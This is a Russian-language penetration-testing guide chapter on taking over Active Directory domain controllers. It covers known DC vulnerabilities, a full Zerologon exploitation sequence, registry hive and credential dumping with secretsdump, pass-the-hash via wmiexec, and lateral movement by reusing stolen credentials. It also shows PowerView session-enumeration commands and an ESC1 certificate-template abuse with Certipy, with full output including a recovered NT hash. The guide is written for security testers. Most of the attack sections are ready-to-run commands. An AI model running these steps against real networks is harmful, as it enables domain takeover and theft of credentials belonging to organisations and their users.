### 14.2 Эксплуатация уязвимостей узла контроллера домена

В серверных системах, которые могут быть настроены как контроллеры домена, а также в протоколах, использующихся
контроллерами, появляются и становятся известными уязвимости, позволяющие взломать сервер и захватить на нем полное
управление.

Это один из самых простых способов компрометировать и захватить управление над контроллером домена.

Примеры таких уязвимостей:

    PrinterNightmare
    ZeroLogon
    SamAccountNameSpoofing
    MS14-068
    Drop The MIC (Во взаимодействии DC с DC) и пр. вплоть до MS17-010

### Zerologon

Рассмотрим эксплуатацию одной из самых ярких уязвимостей в контроллере домена.

**Zerologon** — это название уязвимости с идентификатором CVE-2020-1472. Ее так назвали из-за изъяна процесса Netlogon:
вектор инициализации (IV), который должен был бы представлять собой случайное число, всегда состоит из одних нулей.

-----> Полный разбор эксплойта представлен тут

Эксплуатация Zerologon
Шаги:

1. Сброс пароля при помощи эксплойта:

> python3 cve-2020-1472-exploit.py -n 'DC01$' -t 10.10.0.1

2. Реализация атаки DCSync с пустым паролем:

> python3 secretsdump.py -no-pass -just-dc 'domain.local/DC01$@10.10.0.1'

3. Получаем NT-хеш администратора с “относительным идентификатором” (relative identifier) RID 500 и используем его для
   получения доступа к управлению контроллером через WMI с помощью утилиты пакета Impacket: wmiexec.py:

> python3 wmiexec.py -hashes <hash-value> 'domain.local/DC01$@10.10.0.1'

После успешного изменения пароля DC сервер Active Directory работает некорректно. Чтобы DC продолжал нормально работать,
необходимо переустановить исходный хэш пароля.

4. Создаем и скачиваем резервные копии реестра для восстановления пароля DC:

       reg save HKLM\SYSTEM system.save
       reg save HKLM\SAM sam.save
       reg save HKLM\SECURITY security.save
       lget system.save
       lget sam.save
       lget security.save
       del /f system.save
       del /f sam.save
       del /f security.save

5. Извлекаем пароль из извлеченных копий реестра:

> python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL

6. Получаем пароль машины контроллера домена в строке:

> $MACHINE.ACC:plain_password_hex:b4d1....

7. И инсталлируем хеш машины обратно:

> python3 reinstall_original_pw.py DC-01$ 10.10.0.1 b4d1….

### Кража учетных данных, токенов и сессий привилегированных УЗ

Данный подход — один из наиболее распространенных в сетях, незрелых с точки зрения ИБ заказчиков. Он подразумевает
отсутствие серьезных препятствий на пути пентестера в виде разграничения доступа в сети, Tier-модели Майкрософт,
механизмов Credentials Guard и пр.

Пример

Вы компрометируете машину в домене при помощи эксплойта и получаете доступ уровня NT Authority/System:

- Вы извлекаете учетные данные, ключи и токены доступа из скомпрометированной машины
- Вы пытаетесь переиспользовать полученные доступы в рамках доступной вам сети, подключаясь с полученными данными к
  сервисам SMB, HTTP, MSSQL, RPC, WMI и пр.
- Вы обнаруживаете прочие машины, на которые у вас есть доступ уровня локального администратора
- На скомпрометированных машинах вы вновь извлекаете учетные записи, секреты и токены доступа, уже новых для вас учетных
  записей
- Так вы повторяете шаги, пока не получите учетные данные кого-либо из групп: Administrators, Domain Admins, Enterprise
  Admins
- Как только вы получаете эти учетные записи, вы сможете получить доступ к контроллеру домена по WMI или SMB, или
  выполнить атаку DCSync

### Привилегированные группы

Помимо групп, которые имеют прямой доступ к управлению AD, есть группы, чьи привилегии позволяют нам получить доступ к
группам первой тройки.

      Group Policy Creators Owners
      Account Operators
      Schema Admins
      Event Log Readers
      Backup Operators
      Remote Management Users
      Server Operators
      DnsAdmins

Рассмотреть, как можно повысить доступ к каждой из описанных выше групп, можно тут.

### Сбор информации об объектах в домене

При выборе такого подхода к компрометации домена ваше основное время уйдет на разведку в домене и энумерацию учетных
записей.

Рассмотрим, какие данные важны при сборе информации:

    Домен
    Доменные политики
    Домен контроллеры
    Пользователи
    Компьютеры
    Группы
    Групповые политики (GPO)
    Организационная единица (OU)
    Список управления доступом (ACL)
    Доверительные отношения (Trusts)
    Лес
    Сессии пользователей
    DNS

### Энумерация сессий

При получении доменной учетной записи у вас появится возможность обращаться к машинам в домене и узнавать, какие
активные сессии находятся на машинах в домене.

Для получения информации о сессиях на определенной машине можно воспользоваться утилитой netview пакета Impacket:

> netview.py -target 192.168.1.10 username, где пароль необходимо будет ввести через строку ввода.

А следующей командой можно выгрузить все машины из домена и получить информацию о всех актуальных сессиях в них.

> netview.py domain.local/username

Также извлекать информацию о сессиях на машинах в AD возможно при помощи фреймворка PowerSploit и утилиты PowerView:

    Get-NetLoggedon -ComputerName <servername>
    Get-NetSession -ComputerName <servername>
    Get-LoggedOnLocal -ComputerName <servername>
    Get-LastLoggedon -ComputerName <servername>
    Get-NetRDPSession -ComputerName <servername>

### Сбор информации о пользователях и сессиях

Инструменты разведки в Active Directory

**Для работы с ОС Windows:**

Ручной анализ: ADModule, PowerView, RSAT, ADExplorer, LdapAdmin, ADIDNSRecords
Автоматизированный анализ: ADExplorer, Bloodhound, ADRecon

**Для работы с ОС Linux:**

Ручной анализ: ldapper, ldapsearch, windapsearch, rpcclient, adidnsdump, jxplorer, ldeep
Автоматизированный анализ: bloodhound-python, enum4linux, ldapdomaindump
BloodHound

-----> Тут ссылка на проект

BloodHound использует теорию графов для выявления скрытых и часто непредусмотренных взаимосвязей в среде Active
Directory или Azure.

Пентестеры могут использовать BloodHound для легкого выявления очень сложных путей атаки, которые иначе невозможно было
бы быстро определить.

Защитники могут использовать BloodHound для выявления и устранения таких же путей атаки. Как "синие", так и "красные"
команды могут использовать BloodHound для более глубокого понимания отношений привилегий в среде Active Directory или
Azure.

### Эксплуатация миссконфигураций сервисов в AD

Рассмотрим пример:

Действия хакера в этом примере:

    Вы взломали Linux машины, имеющую доступ в домен (это значит, что у нее есть машинная учетная запись в домене, и она
    хранится где-то в файловой системе).
    С высокой долей вероятности этот файл с названием *.ccache может лежать в папке /tmp/ или файл *.keytab в папке /etc
    Используя обнаруженный файл доменной машинной учетной записи, вы можете использовать его для атаки PassTheTicket и
    обратиться к какому либо из сервисов AD.
    Вы можете получить доступ в ActiveDirectory через протокол LDAP и узнать, какая машина отвечает за сервис AD CS (Active
    Directory Certificate Services) или же, получив доступ в Windows машине, в домене выполнить команду: certutil -config -
    -ping, для получения списка Certificate Authority.
    Далее, в случае некорректной настройки AD CS, вы можете, используя утилиту Certipy, попробовать выпустить себе
    сертификат по шаблону, который разрешает через аутентификацию клиента получателю сертификата указать произвольное
    альтернативное имя субъекта (SAN).
    Таким образом, вы сможете выпустить сертификат на имя администратора домена и воспользоваться им для получения доступа
    уровня администратора на контроллере домена.

Еще больше примеров атак на AD CS тут

### Одна из утилит для таких атак: Certipy

Утилита Certipy предназначена для автоматизации процесса генерации и управления сертификатами и ключами шифрования в
сетевых приложениях на языке Python. Она предоставляет набор инструментов для создания и управления сертификатами X.509,
которые могут быть использованы для обеспечения безопасной передачи данных через сети, например, для шифрования трафика
HTTPS.

Далее приведен пример, как эксплуатировать одну из неправильных конфигураций для эскалации в домене с помощью Certipy.

Эксплуатация с Certipy

Запрос сертификата по шаблону создания сертификата для другого пользователя:

> $ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC1-Test
> -upn administrator@corp.local -dns dc.corp.local

Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 780
[*] Got certificate with multiple identifications

    UPN: 'administrator@corp.local'
    DNS Host Name: 'dc.corp.local'

[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_dc.pfx'

Запрос TGT и получение NT хеша с использованием полученного ранее сертификата:

> $ certipy auth -pfx administrator_dc.pfx -dc-ip 172.16.126.128

Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:

    [0] UPN: 'administrator@corp.local'

    [1] DNS Host Name: 'dc.corp.local'

> 1
[*] Using principal: dc$@corp.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'dc.ccache'
[*] Trying to retrieve NT hash for 'dc$'
[*] Got NT hash for 'dc$@corp.local': 36a50f712629962b3d5a3641529187b0

### Выводы

Доменная инфраструктура и конкретно инфраструктура Microsoft Active Directory настолько сложна, наполнена зависимостями
и “наследием”, что в своих имплементациях содержит десятки и сотни возможных проблем конфигурации, за которыми сложно
или почти невозможно уследить.

Задачами исследователя безопасности являются:

энумерация всех возможных подходов в каждом сегменте доступа;
исполнение набора цикличных действий по попытке проанализировать защищенность каждого встречающегося в локальной сети
ресурса, протокола, механизма и пр. вплоть до достижения поставленной цели.  
